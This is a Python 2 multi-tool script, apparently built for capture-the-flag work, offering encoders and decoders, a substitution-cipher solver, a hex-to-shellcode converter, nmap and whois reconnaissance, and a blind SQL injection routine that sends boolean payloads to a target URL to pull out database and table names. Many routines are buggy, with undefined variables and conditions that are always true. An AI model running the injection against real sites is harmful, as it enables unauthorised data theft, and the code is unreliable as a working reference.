import hashlib
import re,os
import string
import requests
import random
import base64
from Crypto.Cipher import AES
import codecs
import urllib
from string import lowercase, uppercase
import threading
from general2 import *
from domain_name import *
from ip_address import *
from nmap import *
from robots import *
from whois import *
from ngram_score import *
from pycipher import SimpleSubstitution as SimpleSub



class colors():

    PURPLE = '\033[95m'

    CYAN = '\033[96m'

    DARKCYAN = '\033[36m'

    BLUE = '\033[94m'

    GREEN = '\033[92m'

    YELLOW = '\033[93m'

    RED = '\033[91m'

    ENDC = '\033[0m'



logo = """

8888888b.   .d8888b.           d8b                                        
888  "Y88b d88P  Y88b          Y8P                                        
888    888      .d88P                                                     
888    888     8888"  .d8888b  888 88888b.  888d888 .d88b.  888  888      
888    888      "Y8b. 88K      888 888 "88b 888P"  d88""88b `Y8bd8P'      
888    888 888    888 "Y8888b. 888 888  888 888    888  888   X88K        
888  .d88P Y88b  d88P      X88 888 888 d88P 888    Y88..88P .d8""8b.      
8888888P"   "Y8888P"   88888P' 888 88888P"  888     "Y88P"  888  888      
                                   888                                    
                                   888                                    
                                   888                                                                                               
 """



choice = '''

  ######## Crypto Tools ##########

 1  - Decode hex
 2  - Decode base32
 3  - Decode base64
 4  - Decode AES (CFB\ECB)
 5  - Decode Caeser (Brute-Force)
 6  - Encode hex
 7  - Encode base32
 8  - Encode base64
 9  - Encode AES (CFB\ECB)
 0  - Decode ROT13
 A  - Decode URL
 B  - Decode Morse
 C  - Encode Morse
 D  - Decode Substitution

  ######## GDB Tools ##############
  
 E  - Hex to shell code

  ######## Web Tools ##############

 F  - Information Gatering
 G  - Blind Sql Exploit

  ######### Converter #############

 H  -  Ascii to Text 
 I  -  Reverse Text

'''

xline = "#############################################################################################"

xline2 = "####################### Tool Creadted By D3siprox Team (xor00) ############################"



print(colors.BLUE + logo + colors.ENDC)

print (colors.RED + xline2 + colors.ENDC)

print ""

print choice

print (colors.RED + xline + colors.ENDC)

print ""



user_input =raw_input("Enter your choice (1-10)(A-Z) : ")



if "1" in user_input:

    hex_input = raw_input("Enter Your hex with space : ")

    if "h" in hex_input:

        print("Remove h")



    else:

        first_s = hex_input.split(" ")

        for i in range(len(first_s)):

           decoder = first_s[i].decode('hex')

           i+=1

           print ("Your Decoded Hex %s is : " + decoder.replace('\n',''))%i



if "2" in user_input:

    base32_input = raw_input("Enter You Base32 to Decode : ")

    decode_32 = base64.b32decode(base32_input)

    print ("Your Base32 decoded is  : " + decode_32)



if "3" in user_input:

    base64_input = raw_input("Enter You Base64 to Decode : ")

    decode_64 = base64.b64decode(base64_input)

    print ("Your Base64 decoded is  : " + decode_64)



if "6" in user_input:

    hex2_input = raw_input("Enter Your text To encode in Hex : ")

    first_s1 = hex2_input.split(" ")

    for i in range(len(first_s1)):

       encoder = first_s1[i].encode('hex')

       i+=1

       print ("Your encoded TexT %s is  : " + encoder.replace('\n',''))%i



if "7" in user_input:

    base32_input_2 = raw_input("Enter You Base32 to Encode : ")

    decode_32_2 = base64.b32encode(base32_input_2)

    print ("Your Base32 Encoded is  : " + decode_32_2)



if "8" in user_input:

    base64_input_2 = raw_input("Enter You Base64 to Encode : ")

    decode_64 = base64.b64encode(base64_input_2)

    print ("Your Base64 encoded is  : " + decode_64_2)



if "4" in user_input:

    aes_input = raw_input("Enter Your Text to decode : ")

    key = raw_input('KEY: ')

    method = raw_input('Mode (ECB or CFB) : ')

    if "CFB" or "cfb" in method:

        iv = raw_input("Enter IV : ") 

        aes_cfb_decode = AES.new(key,AES.MODE_CFB,iv)

        result = aes_efb_decode.decode(aes_input)

        print ("Your AES_CFB Decoded Message is : "+ result)

    elif "ECB" or "ecb" in method:

         aes_ecb_decode = AES.new(key,AES.MODE_ECB)

         result1 = aes_ecb_decode.decode(aes_input)

         print("Your AES_ECB Decoded Message is : "+result1)

    else:

        print("Error try later...")

        os.close()



if "9" in user_input:

    aes_input1 = raw_input("Enter Your Text to encode : ")

    key = raw_input('KEY: ')

    method = raw_input('Mode (ECB or CFB ) : ')

    if "CFB" or "cfb" in method:

        iv = raw_input("Enter IV : ") 

        aes_cfb_encode = AES.new(key,AES.MODE_CFB,iv)

        result = aes_efb_encode.encode(aes_input1)

        print ("Your AES_CFB Encoded Message is : "+ result)

    elif "ECB" or "ecb" in method:

         aes_ecb_encode = AES.new(key,AES.MODE_ECB)

         result1 = aes_ecb_enecode.encode(aes_input1)

         print("Your AES_ECB Encoded Message is : "+result1)

    else:

        print("Error try later...")

        os.close()

if "5" in user_input:

    caeser_input = raw_input("Enter Your Cipher Text : ")

    for i in range(0,26):

      dec =""

      for c in caeser_input:

         if ord(c)>=ord('a') and ord(c)<=ord('z'):

            dec += chr((((ord(c)+ord('a'))+i)%26)+ord('a'))

         elif ord(c)>=ord('A') and ord(c)<=ord('Z'):

            dec += chr((((ord(c)+ord('A'))+i)%26)+ord('Z'))



         else:

           dec += c



           print ("Your decoded Text is :  "+ dec )



if "0" in user_input:

   rot13_input = raw_input("Enter Your ROT13 to decode : ")

   rot13_decode = codecs.decode(rot13_input, 'rot_13')

   print("Your Rot13 Decoded Text is : " + rot13_decode)



if "A" in user_input:

    uri_input = raw_input("Enter Your url to Decode : ")

    uri_decode = urllib.unquote(uri_input).decode('utf8')

    print("Your Url Decoded is : "+ uri_decode)



if "B" in user_input:

   morse_input = raw_input("Enter Your Morse Message : ")

   letter_to_morse = {

    "a" : ".-",     "b" : "-...",     "c" : "-.-.",

    "d" : "-..",    "e" : ".",        "f" : "..-.",

    "g" : "--.",    "h" : "....",     "i" : "..",

    "j" : ".---",   "k" : "-.-",      "l" : ".-..",

    "m" : "--",     "n" : "-.",       "o" : "---",

    "p" : ".--.",   "q" : "--.-",     "r" : ".-.",

    "s" : "...",    "t" : "-",        "u" : "..-",

    "v" : "...-",   "w" : ".--",      "x" : "-..-",

    "y" : "-.--",   "z" : "--..",     " " : "/"

    }



   morse_to_letter = {morse: letter for letter, morse in letter_to_morse.items()}

   

   def decode_morse(morse_code):

        return ''.join(morse_to_letter[code] for code in morse_code.split())



   print("Your Decoded Message is : "+ decode_morse(morse_input))

  

if "C" in user_input:

    

    CODE = {'A': '.-',     'B': '-...',   'C': '-.-.', 

        'D': '-..',    'E': '.',      'F': '..-.',

        'G': '--.',    'H': '....',   'I': '..',

        'J': '.---',   'K': '-.-',    'L': '.-..',

        'M': '--',     'N': '-.',     'O': '---',

        'P': '.--.',   'Q': '--.-',   'R': '.-.',

     	'S': '...',    'T': '-',      'U': '..-',

        'V': '...-',   'W': '.--',    'X': '-..-',

        'Y': '-.--',   'Z': '--..',

        

        '0': '-----',  '1': '.----',  '2': '..---',

        '3': '...--',  '4': '....-',  '5': '.....',

        '6': '-....',  '7': '--...',  '8': '---..',

        '9': '----.' 

        }





    def main():

	msg = raw_input("Enter Your Morse Message : ")

	

	for char in msg:

		print CODE[char.upper()],	

    main()



if "E" in user_input:

    shell_c_input = raw_input("Convert hex code to shellcode : ")

    if "0x" in shell_c_input :

      sp1 = shell_c_input.split('x')[1]

      ste = "\\x"

      sp2 = ste + sp1[-2:] +ste + sp1[-4:-2] +ste + sp1[-6:-4] +ste + sp1[-8:-6]

      print('Your shellcode is : '+sp2)





if "F" in user_input:



    scanned_input = raw_input("Enter your Url to scan : ")

    name_input = raw_input("Enter Your website name : ")

    ROOT_DIR = name_input

    create_dir ( ROOT_DIR )

    def gather_info( name, url ):

      robots_txt = get_robots_txt ( url )

      domain_name = get_domain_name ( url )

      whois = get_whois ( domain_name )

      ip_address = get_ip_address ( domain_name )

      nmap = get_nmap ("-F",ip_address )

      create_report( name, url, domain_name, nmap, robots, whois )

    def create_report( name, url, domain_name, nmap, robots, whois ):

      project_dir = ROOT_DIR + "/" + name

      create_dir( project_dir )

      write_file( project_dir + "/full_url.txt", url)

      write_file( project_dir + "/domain_name.txt", domain_name)

      write_file( project_dir + "/nmap.txt", nmap)

      write_file( project_dir + "/robots.txt", robots )

      write_file( project_dir + "/whois.txt", whois )

    gather_info( name_input, scanned_input )

    print("Scan Completed!!")



if "D" in user_input:
    fitnes = raw_input("Enter Your Dic ( dic1 to dic5 ) : ")
    fitness = ngram_score('dic/'+fitnes + ".txt") 

    ctext= raw_input("Enter Your Cipher : ")
    ctext = re.sub('[^A-Z]','',ctext.upper())

    maxkey = list('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
    maxscore = -99e9
    parentscore,parentkey = maxscore,maxkey[:]
    print "Substitution Cipher solver, you may have to wait several iterations"
    print "for the correct result. Press ctrl+c to exit program."

    i = 0
    while 1:
       i = i+1
       random.shuffle(parentkey)
       deciphered = SimpleSub(parentkey).decipher(ctext)
       parentscore = fitness.score(deciphered)
       count = 0
       while count < 1000:
          a = random.randint(0,25)
          b = random.randint(0,25)
          child = parentkey[:]
       
          child[a],child[b] = child[b],child[a]
          deciphered = SimpleSub(child).decipher(ctext)
          score = fitness.score(deciphered)

          if score > parentscore:
             parentscore = score
             parentkey = child[:]
             count = 0
          count = count+1

       if parentscore > maxscore:
          
          maxscore,maxkey = parentscore,parentkey[:]
          print '\nbest score so far:',maxscore,'on iteration',i
          ss = SimpleSub(maxkey)
          print '    best key: '+''.join(maxkey)
          print '    plaintext: '+ss.decipher(ctext)


if "H" in   user_input:
     message = raw_input("Enter ASCII codes: ")

     decodedMessage = ""

     for item in message.split():
       decodedMessage += chr(int(item))   

       print "Decoded message:", decodedMessage


if "I" in user_input:
    message_to_rev = raw_input("Enter Your Message to reverse: ")
    mssg2 =  message_to_rev.split(" ")
    for i in range(len(mssg2)):
        reverse = mssg2[i][::-1]
        i+=1
        print("Your Reversed Text %s is :" + reverse)%i
        
        
if "G" in  user_input:
    url = raw_input("Enter Your Vulnerable Website : ")

    strings = string.letters + string.digits + string.punctuation
    check = 'SQL'
    print "[+] Your Target is : " + url
    dbname = ''
    for k in xrange(1,14,1):
     for m in strings:
        
        req = requests.get(url+"'" +'AND (select ascii(substr(database(),' + str(k) + ',1)))='+ str(ord(m))+" --+")
        print "[+] Injection Successful"
        print("[+] Getting Database....")
        time.sleep(2)
    
        if re.search(check, req.text) is not None:
            print "[+] Found "+dbname 
            dbname += str(m)
            break 

    print '[+] Database name : ' + dbname

    tables = ''          
    for k in xrange(1,14,1):
       for m in charset:
       

          req = requests.get(url+"'" +"AND (select ascii(substr((select concat(table_name) from information_schema.tables where table_schema='"+dbname+"' limit 0,1)," + str(k) + ',1)))='+ str(ord(m))+" --+")
          print("[+] Getting Tables....")
          time.sleep(2)

          if re.search(text, req.text) is not None:
              print "[+] Found "+tables 
              tables += str(m)
              break   
    print   tables
    


    
